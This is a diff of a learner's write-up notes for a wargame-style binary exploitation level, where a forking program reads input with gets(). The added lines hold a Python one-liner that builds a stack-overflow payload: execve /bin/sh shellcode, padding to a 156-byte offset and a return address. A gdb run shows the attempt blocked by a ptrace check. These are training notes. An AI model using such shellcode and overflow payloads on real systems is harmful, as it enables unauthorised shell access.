@@ -4,23 +4,44 @@
 <explanation about: the type of binary in high level and the type of vulnerability>
 
 ## Steps (copiable for the correction)
-<steps for the solution, with explanation on how you found out>
 
 ### gets
 *there is vulnerability with `gets`*
 
 let's check address of each variables.
 
-argument of gets: `%esp+0x20` = `0xffffd610+0x20` = `0xffffd630`\
-return value of `fork` = adress of `pid`: `%esp+0xac` = `0xffffd6bc`\
-offset: 172 - 32 = 140
-`&v4` = `0xffffd62c`
+address of argument of gets: `%esp+0x20` = `0xffffd630`\
+address of return address: `%ebp+0x4` = `0xffffd6cc`\
+offset = 156 bytes
+
+```
+python -c '''
+shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+padding = "x"*(156-len(shellcode))
+address = "\xff\xff\xd6\x30"[::-1]
+print shellcode + padding + address
+''' > /tmp/04
+
+(gdb) r <<< $(cat /tmp/04)
+Starting program: /home/users/level04/level04 <<< $(cat /tmp/04)
+Give me some shellcode, k
+no exec() for you
+[Inferior 1 (process 2007) exited normally]
+```
+
+this method is blocked by in `parent`
+```
+while ( v8 != 11 );
+puts("no exec() for you");
+kill(v9, 9);
+```
+
 
 ### challenge
 1. weird if statement. \
 `if ( (v4 & 0x7F) == 0 || (v7 = v4, (char)((v4 & 0x7F) + 1) >> 1 > 0) )`\
 It seems impossible to pass it... 
-2. how to make shellcode be executed?
+
 3. not fully understand how `ptrace` works. 
 
 ### reference links
@@ -58,31 +79,13 @@ puts("no exec() for you");
 kill(v9, 9);
 ```
 
+
+
 ```
 (gdb) set follow-fork-mode child
 (gdb) set follow-fork-mode parent
 ```
 
-```
-v4 = 0x1c(%esp)=  0xffffd62c
-v6 = 0xa0(%esp) = 0xffffd6bc
-v7 = 0xa4(%esp) = 0xffffd6b4
-
-0x8048775 <main+173>    mov    0x1c(%esp),%eax -> eax: 0x157f
-0x8048779 <main+177>    mov    %eax,0xa0(%esp)
-0x8048780 <main+184>    mov    0xa0(%esp),%eax
-0x8048787 <main+191>    and    $0x7f,%eax
-0x804878a <main+194>    test   %eax,%eax
-0x804878c <main+196>    je     0x80487ac <main+228>
-
-0x804878e <main+198>    mov    0x1c(%esp),%eax
-0x8048792 <main+202>    mov    %eax,0xa4(%esp)
-0x8048799 <main+209>    mov    0xa4(%esp),%eax
-0x80487a0 <main+216>    and    $0x7f,%eax
-0x80487a3 <main+219>    add    $0x1,%eax
-0x80487a6 <main+222>    sar    %al
-0x80487a8 <main+224>    test   %al,%al
-```
 
 ## Payload (Most important command to obtain the flag)
 
